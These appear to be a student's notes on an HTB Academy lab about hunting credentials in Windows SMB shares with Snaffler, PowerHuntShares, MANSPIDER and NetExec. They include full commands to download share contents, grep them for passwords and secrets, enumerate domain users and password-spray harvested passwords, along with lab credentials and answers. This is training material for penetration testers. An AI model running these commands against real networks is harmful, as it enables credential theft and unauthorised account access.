
- quick reminder, here are some general tips:

- Look for keywords within files such as `passw`, `user`, `token`, `key`, and `secret`.
- Search for files with extensions commonly associated with stored credentials, such as `.ini`, `.cfg`, `.env`, `.xlsx`, `.ps1`, and `.bat`.
- Watch for files with "interesting" names that include terms like `config`, `user`, `passw`, `cred`, or `initial`.
- If you're trying to locate credentials within the `INLANEFREIGHT.LOCAL` domain, it may be helpful to search for files containing the string `INLANEFREIGHT\`.
- Keywords should be localized based on the target; if you are attacking a German company, it's more likely they will reference a `"Benutzer"` than a `"User"`.
- Pay attention to the shares you are looking at, and be strategic. If you scan ten shares with thousands of files each, it's going to take a significant amount of time. Shares used by `IT employees` might be a more valuable target than those used for company photos.

## Hunting from Windows

#### Snaffler

```cmd-session
Snaffler.exe -s
```


- Two useful parameters that can help refine Snaffler's search process are:

- `-u` retrieves a list of users from Active Directory and searches for references to them in files
- `-i` and `-n` allow you to specify which shares should be included in the search
#### PowerHuntShares

- Doesn't necessarily need to be run on a domain-joined machine.

```powershell-session
PS C:\Users\Public\PowerHuntShares> Invoke-HuntSMBShares -Threads 100 -OutputDirectory c:\Users\Public
```


## Hunting from Linux

#### MANSPIDER

If we don’t have access to a domain-joined computer, or simply prefer to search for files remotely, tools like [MANSPIDER](https://github.com/blacklanternsecurity/MANSPIDER) allow us to scan SMB shares from Linux. It's best to run `MANSPIDER` using the official Docker container to avoid dependency issues. Like the other tools, `MANSPIDER` offers many parameters that can be configured to fine-tune the search. A basic scan for files containing the string `passw` can be run as follows:

  Credential Hunting in Network Shares

```shell-session
HrithikManoj000@htb[/htb]$ docker run --rm -v ./manspider:/root/.manspider blacklanternsecurity/manspider 10.129.234.121 -c 'passw' -u 'mendres' -p 'Inlanefreight2025!'

[+] MANSPIDER command executed: /usr/local/bin/manspider 10.129.234.121 -c passw -u mendres -p Inlanefreight2025!
[+] Skipping files larger than 10.00MB
[+] Using 5 threads
[+] Searching by file content: "passw"
[+] Matching files will be downloaded to /root/.manspider/loot
[+] 10.129.234.121: Successful login as "mendres"
[+] 10.129.234.121: Successful login as "mendres"
<SNIP>
```

#### NetExec

In addition to its many other uses, `NetExec` can also be used to search through network shares using the `--spider` option. This functionality is described in great detail on the [official wiki](https://www.netexec.wiki/smb-protocol/spidering-shares). A basic scan of network shares for files containing the string `"passw"` can be run like so:

  Credential Hunting in Network Shares

```shell-session
HrithikManoj000@htb[/htb]$ nxc smb 10.129.234.121 -u mendres -p 'Inlanefreight2025!' --spider IT --content --pattern "passw"

SMB         10.129.234.121  445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:inlanefreight.local) (signing:True) (SMBv1:False)
SMB         10.129.234.121  445    DC01             [+] inlanefreight.local\mendres:Inlanefreight2025! 
SMB         10.129.234.121  445    DC01             [*] Started spidering
SMB         10.129.234.121  445    DC01             [*] Spidering .
<SNIP>
```


## Lab

One of the shares mendres has access to contains valid credentials of another domain user. What is their password?

- First we can list the shares with nxc using the credentials provided: 
```
nxc smb <IP> -u 'mendres' -p 'Inlanefreight2025!' --shares
```

![[Pasted image 20260221103910.png]]
- Now lets enumerate the uncommon shares that we can see here, ie IT, HR, Company, Marketing, Sales, Finance ect..
### IT

```
nxc smb 10.129.234.173 -u 'mendres' -p 'Inlanefreight2025!' \
  -M spider_plus -o DOWNLOAD_FLAG=True OUTPUT_FOLDER=~/shares/IT \
  --smb-timeout 60 --timeout 600
```

```
 cd ~/shares/IT
grep -r -i -E "password|passw|pwd|credential|key|secret|hash|api|token|admin|Inlanefreight|pass:|pwd:|credential:|key:|secret:" .
grep -r -i "inlanefreight" .
find . -type f $$   -name "*.ps1" -o -name "*.bat" -o -name "*.vbs" -o -name "*.rdp" -o -name "*.kdbx" -o -name "*.config" -o -name "*.txt"   $$ -exec grep -i "password\|pass\|cred\|key" {} + 2>/dev/null
```
![[Pasted image 20260221113037.png]]


- And the above command revealed some creds : 
```
./10.129.234.173/HR/Public/Onboarding_Docs_485.docx:password=HRrocks2025!
./10.129.234.173/Company/Templates/Benefits_Overview_10.txt:password=Summer2023!
./10.129.234.173/Company/Templates/Benefits_Overview_14.docx:login=templateadmin
./10.129.234.173/Company/Templates/Expense_Claim_14.pdf:login=templateadmin
./10.129.234.173/Company/Templates/Expense_Claim_10.xlsx:passwd=Draft456!
./10.129.234.173/Company/Templates/Policy_Update_15.txt:password=Summer2023!
./10.129.234.173/Company/Templates/IT_Guideline_54.pdf:password=Summer2023!
./10.129.234.173/Company/Templates/Expense_Claim_85.txt:password: SecureDocs99
./10.129.234.173/Company/Forms/Incident_Report_57.xlsx:password=Summer2023!
./10.129.234.173/Company/Forms/Security_Notice_1.docx:password=Form@1234
./10.129.234.173/Company/Forms/Internal_Template_36.docx:password: SecureDocs99
./10.129.234.173/Company/Forms/HR_Form_14.pdf:password: SecureDocs99
./10.129.234.173/Company/Policies/Internal_Template_57.docx:password=Form@1234
./10.129.234.173/Company/Policies/Employee_Leave_Form_61.xlsx:password: SecureDocs99
./10.129.234.173/Company/Policies/Security_Notice_25.xlsx:passwd=Draft456!
./10.129.234.173/Company/Policies/Incident_Report_90.xlsx:password=Form@1234
./10.129.234.173/Company/Policies/HR_Form_36.pdf:password=Summer2023!
┌─[eu-academy-1]─[10.10.14.233]─[htb-ac-2081772@htb-yhkeflf1vd-htb-cloud

```

![[Pasted image 20260221113217.png]]

- Lets try to enumerate other uses in the AD environment and then password spray them.
##### Enumerating other uses in AD with netexec

```
nxc smb 10.129.234.173 -u 'mendres' -p 'Inlanefreight2025!' --users
```

![[Pasted image 20260221113708.png]]

- we got the usernames of the other users in the AD environment, now store these names into a file and then we can password spray the passwords that we found from the IT share on these acccounts.
```
# Spray list of passwords on all users ( --no-bruteforce avoids account lockouts by not trying combos per user)
nxc smb 10.129.234.173 -u ~/clean_users.txt -p 'HRrocks2025!,Summer2023!,Draft456!,SecureDocs99,Form@1234' --no-bruteforce --continue-on-success
```

- IT failed :)
- Upon further thought process, I used grep to search for the word "pass" in all the files that we downloaded using nxc and searched manually.
![[Pasted image 20260221120501.png]]
- it took a long long time.. grrr

As this user, search through the additional shares they have access to and identify the password of a domain administrator. What is it?

- Lets find the available shares first
- using spider_plus flag to download all the files
```
 nxc smb 10.129.234.173 -u 'jbader' -p 'ILovePower333###' -M spider_plus -o DOWNLOAD_FLAG=True OUTPUT_FOLDER=~/shares/jbader --shares --verbose
```

- Followed the same procedures as the previous user and got the credentials : 

![[Pasted image 20260221125311.png]]